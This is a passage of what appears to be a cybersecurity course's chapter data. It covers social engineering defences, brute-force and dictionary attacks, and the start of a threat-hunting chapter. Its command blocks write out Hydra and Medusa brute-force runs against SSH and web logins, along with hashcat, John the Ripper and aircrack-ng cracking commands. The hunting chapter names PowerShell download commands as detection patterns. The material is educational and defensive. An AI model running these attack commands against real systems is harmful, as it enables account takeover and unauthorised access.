                </div>

                <h4 class="sub-h">Why Social Engineering Works</h4>
                <ul class="content-list">
                  <li><strong>Human Nature:</strong> Trust, curiosity, fear, and helpfulness are hard to patch.</li>
                  <li><strong>Bypasses Technology:</strong> Firewalls and antivirus cannot stop a person from giving away a password.</li>
                  <li><strong>Low Cost, High Reward:</strong> Minimal investment for potentially massive gain.</li>
                  <li><strong>Difficult to Detect:</strong> No obvious technical indicators.</li>
                  <li><strong>Scalable:</strong> Can target thousands with minimal effort.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls</h3>

                <h4 class="sub-h">Security Awareness Training</h4>
                <ul class="content-list">
                  <li><strong>Regular Training:</strong> Conduct mandatory security awareness training for all employees.</li>
                  <li><strong>Simulated Attacks:</strong> Run phishing simulations, USB drop tests, and tailgating exercises.</li>
                  <li><strong>Report Culture:</strong> Encourage employees to report suspicious activity without fear.</li>
                  <li><strong>Recognize Red Flags:</strong> Unexpected requests for information, urgency or threats, requests that bypass normal procedures, unknown individuals in restricted areas, unsolicited USB drives or downloads.</li>
                  <li><strong>Verify Identity:</strong> Always verify the identity of anyone requesting information or access.</li>
                  <li><strong>Use Separate Channels:</strong> Confirm requests via a known, trusted channel.</li>
                </ul>

                <h4 class="sub-h">Physical Security</h4>
                <ul class="content-list">
                  <li><strong>Access Control:</strong> Use badge access, biometrics, or PINs for all secure areas.</li>
                  <li><strong>Mantraps:</strong> Deploy mantraps or turnstiles to prevent tailgating.</li>
                  <li><strong>Security Guards:</strong> Station guards at entrances to challenge unknown individuals.</li>
                  <li><strong>CCTV:</strong> Monitor entrances and restricted areas.</li>
                  <li><strong>Visitor Management:</strong> Require visitors to sign in, wear badges, and be escorted.</li>
                  <li><strong>Clean Desk Policy:</strong> Ensure sensitive information is not left unattended.</li>
                  <li><strong>Shred Documents:</strong> Cross-cut shred all sensitive documents.</li>
                  <li><strong>Lock Cabinets:</strong> Secure physical documents and equipment.</li>
                  <li><strong>USB Port Blockers:</strong> Disable or block unused USB ports.</li>
                  <li><strong>Endpoint Protection:</strong> Disable autorun for USB devices.</li>
                </ul>

                <h4 class="sub-h">Technical Controls</h4>
                <ul class="content-list">
                  <li><strong>Email Filtering:</strong> Block phishing emails and malicious attachments.</li>
                  <li><strong>DMARC, SPF, DKIM:</strong> Prevent email spoofing.</li>
                  <li><strong>MFA:</strong> Multi-factor authentication prevents credential abuse.</li>
                  <li><strong>Password Managers:</strong> Auto-fill only on legitimate domains.</li>
                  <li><strong>Endpoint Detection and Response (EDR):</strong> Detect and block malware from USB or downloads.</li>
                  <li><strong>Application Whitelisting:</strong> Block unauthorized executables.</li>
                  <li><strong>Network Segmentation:</strong> Limit lateral movement.</li>
                  <li><strong>Logging and Monitoring:</strong> Detect unusual activity.</li>
                  <li><strong>SIEM:</strong> Correlate events for early detection.</li>
                </ul>

                <h4 class="sub-h">Policies and Procedures</h4>
                <ul class="content-list">
                  <li><strong>Verification Policy:</strong> Require verification for all sensitive requests.</li>
                  <li><strong>Payment Approval:</strong> Require multiple approvals for wire transfers.</li>
                  <li><strong>Incident Response Plan:</strong> Define steps for responding to social engineering incidents.</li>
                  <li><strong>Third-Party Risk Management:</strong> Assess vendors' security.</li>
                  <li><strong>Onboarding and Offboarding:</strong> Securely manage employee access.</li>
                  <li><strong>Background Checks:</strong> Screen employees with access to sensitive information.</li>
                  <li><strong>Non-Disclosure Agreements:</strong> Protect confidential information.</li>
                </ul>

                <h4 class="sub-h">Incident Response for Social Engineering</h4>
                <ul class="content-list">
                  <li><strong>Identification:</strong> Detect the attack (user reports, anomaly detection).</li>
                  <li><strong>Containment:</strong> Isolate affected systems, disable compromised accounts.</li>
                  <li><strong>Eradication:</strong> Remove malware, reset credentials, revoke access.</li>
                  <li><strong>Recovery:</strong> Restore systems and data from backups.</li>
                  <li><strong>Lessons Learned:</strong> Update training, policies, and controls.</li>
                  <li><strong>Reporting:</strong> Notify law enforcement if necessary.</li>
                </ul>

                <h4 class="sub-h">Legal and Regulatory</h4>
                <ul class="content-list">
                  <li><strong>Report to Authorities:</strong> Report social engineering incidents to law enforcement.</li>
                  <li><strong>Compliance:</strong> Ensure controls meet regulations (GDPR, HIPAA, PCI DSS).</li>
                  <li><strong>Insurance:</strong> Consider cyber insurance for social engineering losses.</li>
                  <li><strong>Laws:</strong> In Pakistan, social engineering attacks may violate PECA 2016.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Social-Engineer Toolkit (SET)</span><span>Framework for social engineering attacks</span></div>
                  <div class="tool-row"><span>Gophish</span><span>Open-source phishing framework</span></div>
                  <div class="tool-row"><span>Evilginx2</span><span>MITM phishing for 2FA bypass</span></div>
                  <div class="tool-row"><span>USB Rubber Ducky</span><span>Programmable USB attack tool</span></div>
                  <div class="tool-row"><span>Maltego</span><span>OSINT and link analysis</span></div>
                  <div class="tool-row"><span>theHarvester</span><span>Email and domain reconnaissance</span></div>
                  <div class="tool-row"><span>Sherlock</span><span>Username reconnaissance</span></div>
                  <div class="tool-row"><span>KnowBe4</span><span>Security awareness training</span></div>
                  <div class="tool-row"><span>Cofense</span><span>Phishing defense and training</span></div>
                  <div class="tool-row"><span>Proofpoint</span><span>Email security and awareness</span></div>
                  <div class="tool-row"><span>Mimecast</span><span>Email security and awareness</span></div>
                  <div class="tool-row"><span>APWG</span><span>Anti-Phishing Working Group</span></div>
                  <div class="tool-row"><span>FBI IC3</span><span>Report social engineering and BEC</span></div>
                  <div class="tool-row"><span>SANS Security Awareness</span><span>Training resources</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Social Engineering &amp; OSINT Commands</span></div>
                  <pre><code># Gather emails and subdomains
theHarvester -d example.com -b google

# Find usernames across social media
sherlock username

# Launch Maltego for OSINT
maltego

# Launch Social-Engineer Toolkit
setoolkit

# Launch Gophish
gophish

# Launch Evilginx2
evilginx2

# Check headers
curl -I https://example.com

# Check domain registration
whois example.com</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Social engineering exploits human psychology, not technical flaws.</li>
                  <li>Baiting uses curiosity or greed (USB drives, downloads).</li>
                  <li>Tailgating exploits politeness to gain physical access.</li>
                  <li>Pretexting uses fabricated scenarios and impersonation.</li>
                  <li>Common psychological triggers: authority, urgency, fear, curiosity, helpfulness.</li>
                  <li>Attackers use SET, Gophish, Evilginx2, USB Rubber Ducky, OSINT tools.</li>
                  <li>Defenses: security awareness training, simulated attacks, physical security, verification policies, MFA, email filtering.</li>
                  <li>Incident response: identify, contain, eradicate, recover, learn.</li>
                  <li>Report social engineering incidents to authorities.</li>
                  <li>Understanding social engineering is essential for protecting people and organizations.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener">Social-Engineer Toolkit (SET)</a>
                  <a href="https://getgophish.com/" target="_blank" rel="noopener">Gophish — Open-source phishing framework</a>
                  <a href="https://github.com/kgretzky/evilginx2" target="_blank" rel="noopener">Evilginx2 — MITM phishing</a>
                  <a href="https://www.maltego.com/" target="_blank" rel="noopener">Maltego — OSINT and link analysis</a>
                  <a href="https://www.sans.org/security-awareness-training/" target="_blank" rel="noopener">SANS Security Awareness Training</a>
                </div>
              </section>
            ` },
                    { id: "4.10", title: "Brute-Force & Dictionary Attacks", pages: "469-484", read: 20,
            build: "Crack a set of MD5 hashes with Hashcat and implement account lockout.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>A Brute-Force Attack</strong> is a trial-and-error method used to obtain information such as a password, encryption key, or personal identification number. An attacker systematically attempts every possible combination of characters until the correct one is found. Brute-force attacks are exhaustive and guaranteed to succeed eventually if given unlimited time and resources, but they can be extremely slow against long, complex passwords.</p>
                <p><strong>A Dictionary Attack</strong> is a type of brute-force attack that uses a predefined list of common words, phrases, and passwords rather than trying every possible combination. It is faster than a full brute-force attack because it targets the human tendency to choose weak, predictable passwords. Dictionary attacks often include variations such as replacing letters with numbers or adding common suffixes.</p>
                <p>Together, brute-force and dictionary attacks are among the most common methods used to compromise authentication systems, both online and offline.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenarios</h3>
                <ul class="content-list">
                  <li><strong>Online Brute-Force:</strong> An attacker targets a web application's login page. Using a tool like Hydra, they attempt thousands of username and password combinations against the login form. If the application does not implement account lockout or rate limiting, the attacker can continue until the correct credentials are found.</li>
                  <li><strong>Offline Dictionary Attack:</strong> An attacker steals a database of password hashes. Using Hashcat and a wordlist such as RockYou.txt, they compare the hash of each common password against the stolen hashes. Because many users choose weak passwords, the attacker quickly recovers a significant portion of the passwords.</li>
                  <li><strong>Credential Stuffing:</strong> An attacker obtains a list of username and password pairs from a previous data breach. They then use automated tools to try these credentials on many different websites. Because users often reuse passwords across services, the attacker gains access to multiple accounts.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Brute-Force &amp; Dictionary Attacks In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/brute-force.png" alt="Brute-force and dictionary attack flow — online login attempts and offline hash cracking" />
                  <figcaption>Figure 4.10 — Brute-force tries every combination; dictionary attacks use common passwords. Online attacks target live services; offline attacks target stolen hashes.</figcaption>
                </figure>

                <h4 class="sub-h">How Brute-Force Attacks Work</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Target Identification: Attacker identifies an authentication endpoint (login page, SSH, RDP, Wi-Fi WPA handshake, encrypted file, password hash).</div>
                  <div class="step-item"><span class="step-num">2</span> Character Set Selection: Attacker defines the set of characters to try (lowercase, uppercase, digits, symbols).</div>
                  <div class="step-item"><span class="step-num">3</span> Combination Generation: Attacker generates all possible combinations of a given length.</div>
                  <div class="step-item"><span class="step-num">4</span> Attempt Loop: Each combination is tested against the target.</div>
                  <div class="step-item"><span class="step-num">5</span> Success Detection: When the correct combination is found, access is granted.</div>
                </div>
                <p>The time required depends on: password length, character set size, number of attempts per second, and whether the attack is online or offline.</p>

                <h4 class="sub-h">How Dictionary Attacks Work</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Wordlist Selection: Attacker chooses a list of common passwords (e.g., RockYou.txt, SecLists).</div>
                  <div class="step-item"><span class="step-num">2</span> Rule Application: Attacker applies rules to mutate words (capitalize first letter, append numbers, replace 'a' with '@').</div>
                  <div class="step-item"><span class="step-num">3</span> Attempt Loop: Each mutated word is tested.</div>
                  <div class="step-item"><span class="step-num">4</span> Success Detection: When a match is found, access is granted.</div>
                </div>

                <h4 class="sub-h">Types of Brute-Force and Dictionary Attacks</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span></div>
                  <div class="tool-row"><span>Pure Brute-Force</span><span>Tries every possible combination.</span></div>
                  <div class="tool-row"><span>Dictionary Attack</span><span>Uses a list of common words and passwords.</span></div>
                  <div class="tool-row"><span>Hybrid Attack</span><span>Combines dictionary words with brute-force variations (e.g., password123, P@ssw0rd).</span></div>
                  <div class="tool-row"><span>Credential Stuffing</span><span>Uses leaked credentials from one breach to access other services.</span></div>
                  <div class="tool-row"><span>Password Spraying</span><span>Tries a few common passwords against many accounts to avoid lockout.</span></div>
                  <div class="tool-row"><span>Reverse Brute-Force</span><span>Uses a single password against many usernames.</span></div>
                  <div class="tool-row"><span>Rainbow Table Attack</span><span>Uses precomputed hash tables to reverse hashes.</span></div>
                  <div class="tool-row"><span>Offline Attack</span><span>Targets stolen password hashes without interacting with the live system.</span></div>
                  <div class="tool-row"><span>Online Attack</span><span>Targets live authentication services.</span></div>
                  <div class="tool-row"><span>Distributed Attack</span><span>Uses multiple systems or botnets to parallelize attempts.</span></div>
                </div>

                <h4 class="sub-h">Online vs Offline Attacks</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Feature</span><span>Online Attack</span><span>Offline Attack</span></div>
                  <div class="tool-row"><span>Target</span><span>Live authentication service</span><span>Stolen password hashes</span></div>
                  <div class="tool-row"><span>Speed</span><span>Limited by network and server</span><span>Very fast (GPU/ASIC)</span></div>
                  <div class="tool-row"><span>Detection</span><span>Easier to detect</span><span>Harder to detect</span></div>
                  <div class="tool-row"><span>Lockout</span><span>Account lockout possible</span><span>No lockout</span></div>
                  <div class="tool-row"><span>Example</span><span>SSH brute-force</span><span>Hashcat on stolen database</span></div>
                </div>

                <h4 class="sub-h">Password Entropy and Search Space</h4>
                <p>Password entropy measures the difficulty of guessing a password. It is calculated as: <strong>E = L × log₂(N)</strong>, where L = password length and N = character set size.</p>
                <ul class="content-list">
                  <li>An 8-character password using lowercase letters only (26 characters): E = 8 × log₂(26) ≈ 37.6 bits.</li>
                  <li>A 12-character password using uppercase, lowercase, digits, and symbols (94 characters): E = 12 × log₂(94) ≈ 78.7 bits.</li>
                  <li>Higher entropy makes brute-force attacks exponentially harder.</li>
                </ul>

                <h4 class="sub-h">Password Cracking Speed</h4>
                <ul class="content-list">
                  <li><strong>MD5:</strong> ~200 billion hashes/second on high-end GPUs.</li>
                  <li><strong>bcrypt:</strong> ~10,000 hashes/second.</li>
                  <li><strong>Argon2:</strong> even slower.</li>
                </ul>
                <p>This is why password hashing algorithms must be intentionally slow and memory-hard.</p>

                <h4 class="sub-h">Common Wordlists</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Wordlist</span><span>Description</span></div>
                  <div class="tool-row"><span>RockYou.txt</span><span>14 million passwords from the 2009 RockYou breach.</span></div>
                  <div class="tool-row"><span>SecLists</span><span>Collection of wordlists for security testing.</span></div>
                  <div class="tool-row"><span>CrackStation</span><span>Large wordlist with common passwords.</span></div>
                  <div class="tool-row"><span>Have I Been Pwned</span><span>Breached password lists.</span></div>
                  <div class="tool-row"><span>Weakpass</span><span>Collection of weak passwords.</span></div>
                  <div class="tool-row"><span>Probable-Wordlists</span><span>Real-world password lists.</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Attack Tools</span>
                    <ul>
                      <li><strong>Hydra:</strong> Online brute-force for many protocols.</li>
                      <li><strong>Medusa:</strong> Parallel online brute-force.</li>
                      <li><strong>Patator:</strong> Multi-purpose brute-force tool.</li>
                      <li><strong>Hashcat:</strong> GPU-accelerated offline hash cracking.</li>
                      <li><strong>John the Ripper:</strong> CPU/GPU password cracker.</li>
                      <li><strong>Burp Suite Intruder:</strong> Web login brute-force.</li>
                      <li><strong>OWASP ZAP Fuzzer:</strong> Web login brute-force.</li>
                      <li><strong>Metasploit:</strong> Auxiliary brute-force modules.</li>
                      <li><strong>Ncrack:</strong> Network authentication cracking.</li>
                      <li><strong>Aircrack-ng:</strong> Wi-Fi WPA/WPA2 cracking.</li>
                      <li><strong>CeWL:</strong> Custom wordlist generator from websites.</li>
                      <li><strong>Crunch:</strong> Wordlist generator.</li>
                      <li><strong>CUPP:</strong> Common User Passwords Profiler.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Real-World Brute-Force Incidents</span>
                    <ul>
                      <li><strong>2012 LinkedIn Breach:</strong> 6.5 million password hashes leaked; many cracked using dictionary attacks.</li>
                      <li><strong>2013 Adobe Breach:</strong> 150 million records; weak encryption and dictionary attacks exposed passwords.</li>
                      <li><strong>2016 Yahoo Breach:</strong> 500 million accounts; credential stuffing.</li>
                      <li><strong>2020 Twitter Hack:</strong> Social engineering and credential abuse.</li>
                      <li><strong>2021 Colonial Pipeline:</strong> Compromised password led to ransomware.</li>
                      <li><strong>2023 23andMe Breach:</strong> Credential stuffing exposed millions of records.</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls</h3>

                <h4 class="sub-h">Password Policies</h4>
                <ul class="content-list">
                  <li>Enforce minimum length (12+ characters).</li>
                  <li>Encourage passphrases instead of complex but short passwords.</li>
                  <li>Check against breached password lists (Have I Been Pwned).</li>
                  <li>Prohibit common passwords and dictionary words.</li>
                  <li>Implement password history to prevent reuse.</li>
                  <li>Use password managers to generate and store unique passwords.</li>
                </ul>

                <h4 class="sub-h">Account Lockout and Rate Limiting</h4>
                <ul class="content-list">
                  <li>Lock accounts after a small number of failed attempts (e.g., 5–10).</li>
                  <li>Implement exponential backoff for repeated failures.</li>
                  <li>Use CAPTCHA after a few failed attempts.</li>
                  <li>Rate limit login attempts per IP, per user, and per session.</li>
                  <li>Monitor for distributed attacks.</li>
                </ul>

                <h4 class="sub-h">Multi-Factor Authentication (MFA)</h4>
                <ul class="content-list">
                  <li>Enable MFA for all accounts, especially privileged ones.</li>
                  <li>Use phishing-resistant MFA (FIDO2/WebAuthn).</li>
                  <li>Avoid SMS-based MFA where possible.</li>
                  <li>Implement number matching for push notifications.</li>
                </ul>

                <h4 class="sub-h">Secure Password Storage</h4>
                <ul class="content-list">
                  <li>Use strong password hashing algorithms (Argon2id, scrypt, bcrypt).</li>
                  <li>Use a unique salt per password.</li>
                  <li>Use a secret pepper stored securely.</li>
                  <li>Use high cost factors to slow down offline attacks.</li>
                  <li>Never store passwords in plaintext or with fast hashes (MD5, SHA-1).</li>
                </ul>

                <h4 class="sub-h">Network and Service Hardening</h4>
                <ul class="content-list">
                  <li>Disable unnecessary services (Telnet, FTP, RDP if not needed).</li>
                  <li>Change default credentials on all devices.</li>
                  <li>Use key-based authentication for SSH.</li>
                  <li>Restrict access by IP address.</li>
                  <li>Use VPN for remote access.</li>
                  <li>Implement port knocking where appropriate.</li>
                  <li>Keep systems patched.</li>
                </ul>

                <h4 class="sub-h">Monitoring and Detection</h4>
                <ul class="content-list">
                  <li>Log all authentication attempts.</li>
                  <li>Monitor for multiple failed logins.</li>
                  <li>Detect credential stuffing patterns (many usernames, few passwords).</li>
                  <li>Detect password spraying (few passwords, many usernames).</li>
                  <li>Use SIEM to correlate events.</li>
                  <li>Alert on impossible travel or unusual login locations.</li>
                  <li>Use threat intelligence to block known malicious IPs.</li>
                </ul>

                <h4 class="sub-h">Incident Response</h4>
                <ul class="content-list">
                  <li><strong>Identification:</strong> Detect brute-force or dictionary attack.</li>
                  <li><strong>Containment:</strong> Lock affected accounts, block source IPs.</li>
                  <li><strong>Eradication:</strong> Reset compromised credentials, revoke sessions.</li>
                  <li><strong>Recovery:</strong> Restore normal access, monitor for further activity.</li>
                  <li><strong>Lessons Learned:</strong> Update policies, strengthen controls, retrain users.</li>
                </ul>

                <h4 class="sub-h">User Education</h4>
                <ul class="content-list">
                  <li>Train users on password hygiene.</li>
                  <li>Encourage use of password managers.</li>
                  <li>Explain risks of password reuse.</li>
                  <li>Teach recognition of phishing and social engineering.</li>
                  <li>Promote reporting of suspicious activity.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Hydra</span><span>Online brute-force</span></div>
                  <div class="tool-row"><span>Medusa</span><span>Parallel brute-force</span></div>
                  <div class="tool-row"><span>Patator</span><span>Multi-purpose brute-force</span></div>
                  <div class="tool-row"><span>Hashcat</span><span>GPU hash cracking</span></div>
                  <div class="tool-row"><span>John the Ripper</span><span>Password cracker</span></div>
                  <div class="tool-row"><span>Burp Suite Intruder</span><span>Web login brute-force</span></div>
                  <div class="tool-row"><span>OWASP ZAP</span><span>Web application scanner</span></div>
                  <div class="tool-row"><span>Metasploit</span><span>Exploitation framework</span></div>
                  <div class="tool-row"><span>Ncrack</span><span>Network authentication cracking</span></div>
                  <div class="tool-row"><span>Aircrack-ng</span><span>Wi-Fi cracking</span></div>
                  <div class="tool-row"><span>CeWL</span><span>Custom wordlist generator</span></div>
                  <div class="tool-row"><span>Crunch</span><span>Wordlist generator</span></div>
                  <div class="tool-row"><span>CUPP</span><span>User password profiler</span></div>
                  <div class="tool-row"><span>RockYou.txt</span><span>Common password wordlist</span></div>
                  <div class="tool-row"><span>SecLists</span><span>Security testing wordlists</span></div>
                  <div class="tool-row"><span>Have I Been Pwned</span><span>Breached password check</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Brute-Force &amp; Hash Cracking Commands (Lab Only)</span></div>
                  <pre><code># SSH brute-force
hydra -l admin -P rockyou.txt 192.168.1.10 ssh

# Web login brute-force
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Medusa SSH brute-force
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh

# Crack MD5 hashes
hashcat -m 0 hashes.txt rockyou.txt

# Crack NTLM hashes
hashcat -m 1000 hashes.txt rockyou.txt

# Crack sha512crypt hashes
hashcat -m 1800 hashes.txt rockyou.txt

# John the Ripper MD5
john --format=raw-md5 hashes.txt
john --wordlist=rockyou.txt hashes.txt

# Generate 8-character wordlist
crunch 8 8 abc123 -o wordlist.txt

# Generate wordlist from website
cewl https://example.com -w wordlist.txt

# Crack WPA handshake
aircrack-ng -w rockyou.txt capture.cap</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Brute-force attacks try every possible combination.</li>
                  <li>Dictionary attacks use common words and passwords.</li>
                  <li>Hybrid attacks combine both.</li>
                  <li>Credential stuffing uses leaked credentials.</li>
                  <li>Password spraying tries few passwords against many accounts.</li>
                  <li>Online attacks target live services; offline attacks target stolen hashes.</li>
                  <li>Password entropy and length determine resistance to brute force.</li>
                  <li>Weak password storage (MD5, SHA-1) makes offline cracking easy.</li>
                  <li>Defenses: strong password policies, MFA, account lockout, rate limiting, secure hashing, monitoring.</li>
                  <li>Tools: Hydra, Medusa, Hashcat, John the Ripper, Burp Suite Intruder.</li>
                  <li>Incident response: identify, contain, eradicate, recover, learn.</li>
                  <li>Understanding brute-force and dictionary attacks is essential for authentication security.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">Hashcat — GPU hash cracking</a>
                  <a href="https://www.openwall.com/john/" target="_blank" rel="noopener">John the Ripper — Password cracker</a>
                  <a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">Hydra — Online brute-force</a>
                  <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">SecLists — Security testing wordlists</a>
                  <a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP — Authentication Cheat Sheet</a>
                </div>
              </section>
            ` },
        ],
      },

      // ============================================================
      // MODULE 5 — DEFENSE
      // ============================================================
      {
        id: "m5",
        type: "part",
        number: 5,
        title: "Defense, Detection & Response",
        icon: "🛡️",
        blurb: "The defender's playbook. This module covers how to spot threats before they hit, secure the systems that hold your data, and respond when something goes wrong.",
        chapters: [
                    { id: "5.1", title: "Threat Detection & Hunting", pages: "485-500", read: 20,
            build: "Write a Sigma rule to detect suspicious PowerShell and hunt for it in logs.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Threat Detection</strong> is the process of identifying malicious activity, security incidents, or policy violations within an organization’s network, systems, or applications. It relies on monitoring, logging, alerting, and analysis to recognize indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) used by adversaries.</p>
                <p><strong>Threat Hunting</strong> is a proactive, human-led, and hypothesis-driven approach to cybersecurity. Instead of waiting for alerts from automated tools, threat hunters actively search for hidden threats that have evaded existing security controls. They assume that adversaries may already be inside the network and seek to identify them before they cause damage.</p>
                <p>Together, threat detection and hunting form a critical part of modern Security Operations Center (SOC) activities and incident response readiness.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p>A SOC analyst notices an alert from the SIEM: a workstation has made an outbound connection to a known malicious IP address. The analyst investigates, correlates logs, and discovers that the workstation was infected via a phishing email. The analyst contains the incident and initiates remediation.</p>
                <p>In a threat hunting scenario, a hunter forms a hypothesis: <em>“Adversaries may use PowerShell to download and execute payloads.”</em> The hunter queries endpoint logs for PowerShell processes that include download commands (e.g., <code>Invoke-WebRequest</code>, <code>DownloadString</code>). They find a previously undetected PowerShell script that has been running on several servers, establishing persistence and communicating with a command-and-control (C2) server. The hunter escalates the finding, and incident response removes the threat.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Threat Detection In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/threat-detection-hunting.png" alt="Threat detection sources and threat hunting loop — hypothesis, investigation, discovery, response, improvement" />
                  <figcaption>Figure 5.1 — Threat detection uses logs and alerts; threat hunting proactively tests hypotheses to uncover hidden threats.</figcaption>
                </figure>

                <h4 class="sub-h">Detection Sources</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Source</span><span>Description</span><span>Examples</span></div>
                  <div class="tool-row"><span>Network Traffic</span><span>Packets traversing the network</span><span>NetFlow, full packet capture, IDS/IPS</span></div>
                  <div class="tool-row"><span>Endpoint Logs</span><span>Activity on hosts</span><span>Windows Event Logs, Sysmon, auditd</span></div>
                  <div class="tool-row"><span>Application Logs</span><span>Web servers, databases, APIs</span><span>Apache, Nginx, SQL logs</span></div>
                  <div class="tool-row"><span>Authentication Logs</span><span>Login attempts, privilege changes</span><span>Active Directory, SSH, VPN</span></div>
                  <div class="tool-row"><span>Cloud Logs</span><span>Cloud infrastructure and services</span><span>AWS CloudTrail, Azure Activity Log</span></div>
                  <div class="tool-row"><span>Threat Intelligence</span><span>External data on threats</span><span>IOCs, TTPs, reputation feeds</span></div>
                  <div class="tool-row"><span>SIEM</span><span>Aggregated and correlated logs</span><span>Splunk, ELK, QRadar, Wazuh</span></div>
                  <div class="tool-row"><span>EDR</span><span>Endpoint detection and response</span><span>CrowdStrike, SentinelOne, Defender ATP</span></div>
                  <div class="tool-row"><span>NDR</span><span>Network detection and response</span><span>Darktrace, Vectra</span></div>
                </div>

                <h4 class="sub-h">Detection Techniques</h4>
                <ul class="content-list">
                  <li><strong>Signature-Based Detection:</strong> Matches known patterns (antivirus signatures, IDS rules).</li>
                  <li><strong>Anomaly-Based Detection:</strong> Identifies deviations from normal behavior.</li>
                  <li><strong>Heuristic Detection:</strong> Uses rules and behavioral indicators.</li>
                  <li><strong>Behavioral Detection:</strong> Focuses on sequences of actions (process chains, lateral movement).</li>
                  <li><strong>Threat Intelligence-Based Detection:</strong> Uses IOCs and TTPs from external sources.</li>
                  <li><strong>Machine Learning Detection:</strong> Uses algorithms to identify patterns and anomalies.</li>
                </ul>

                <h4 class="sub-h">Indicators of Compromise (IOCs)</h4>
                <ul class="content-list">
                  <li>File hashes (MD5, SHA-1, SHA-256)</li>
                  <li>IP addresses and domains</li>
                  <li>URLs and URI patterns</li>
                  <li>Registry keys and values</li>
                  <li>File paths and names</li>
                  <li>Process names and command lines</li>
                  <li>Mutexes</li>
                  <li>User agents</li>
                  <li>SSL/TLS certificates</li>
                  <li>Email addresses and subjects</li>
                </ul>

                <h4 class="sub-h">Indicators of Attack (IOAs)</h4>
                <p>IOAs focus on the behavior and intent of an attack rather than specific artifacts. They are more resilient to change because they describe the adversary’s techniques.</p>
                <ul class="content-list">
                  <li>A process spawning a command shell</li>
                  <li>PowerShell downloading a file</li>
                  <li>Credential dumping (e.g., Mimikatz)</li>
                  <li>Lateral movement via SMB</li>
                  <li>Persistence via scheduled tasks</li>
                </ul>

                <h4 class="sub-h">Detection Engineering</h4>
                <p>Detection engineering is the discipline of designing, building, testing, and maintaining detection rules and logic. It involves:</p>
                <ul class="content-list">
                  <li>Understanding the threat landscape</li>
                  <li>Mapping to frameworks like MITRE ATT&CK</li>
                  <li>Writing detection rules (Sigma, YARA, Snort, Suricata)</li>
                  <li>Testing and tuning rules to reduce false positives</li>
                  <li>Deploying rules to SIEM, EDR, IDS/IPS</li>
                  <li>Continuously improving detection coverage</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Threat Hunting In Depth</h3>

                <h4 class="sub-h">The Threat Hunting Loop</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Hypothesis: Form a hypothesis based on threat intelligence, TTPs, or anomalies.</div>
                  <div class="step-item"><span class="step-num">2</span> Investigation: Query data sources to test the hypothesis.</div>
                  <div class="step-item"><span class="step-num">3</span> Discovery: Identify malicious or suspicious activity.</div>
                  <div class="step-item"><span class="step-num">4</span> Response: Escalate to incident response if a threat is found.</div>
                  <div class="step-item"><span class="step-num">5</span> Improvement: Update detections, automate, and refine hypotheses.</div>
                </div>

                <h4 class="sub-h">Hunting Maturity Model</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Level</span><span>Name</span><span>Description</span></div>
                  <div class="tool-row"><span>0</span><span>Initial</span><span>No hunting; relies on automated alerts.</span></div>
                  <div class="tool-row"><span>1</span><span>Minimal</span><span>Uses threat intelligence feeds; ad hoc hunting.</span></div>
                  <div class="tool-row"><span>2</span><span>Procedural</span><span>Follows documented procedures; uses IOCs.</span></div>
                  <div class="tool-row"><span>3</span><span>Innovative</span><span>Creates new hypotheses; uses TTPs.</span></div>
                  <div class="tool-row"><span>4</span><span>Leading</span><span>Automates hunts; integrates with SOAR; continuous improvement.</span></div>
                </div>

                <h4 class="sub-h">Hypotheses Examples</h4>
                <ul class="content-list">
